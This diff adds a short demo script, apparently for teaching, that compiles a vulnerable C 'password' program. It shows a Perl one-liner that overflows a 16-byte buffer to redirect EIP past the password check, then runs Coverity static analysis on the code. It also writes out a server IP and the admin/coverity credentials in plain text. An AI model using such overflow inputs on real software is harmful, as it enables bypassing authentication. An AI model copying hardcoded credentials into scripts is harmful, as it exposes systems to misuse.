@@ -1,0 +1,18 @@
+Build the source code:
+gcc -m32 -o password password.c
+
+Exploit the vulnerability:
+./password incorrect
+./password secret
+
+# What if I don't know the password?
+# I can cause an overflow of the 16-character array and fill the 
+# EIP register with the address of the authenticated code.
+./password `perl -e 'print "A"x20; printf("%c", 0x7f); printf("%c", 0x84); printf("%c", 0x04); printf("%c", 0x08);'`
+
+
+# Build and Analyze with Coverity
+ cov-build --dir=tmp gcc -m32 -o password password.c
+ cov-analyze --dir=tmp --enable STRING_OVERFLOW --enable SECURE_CODING
+ cov-commit-defects --dir tmp --dataport 9090 --remote 10.0.252.37 --user admin --password coverity --stream password
+
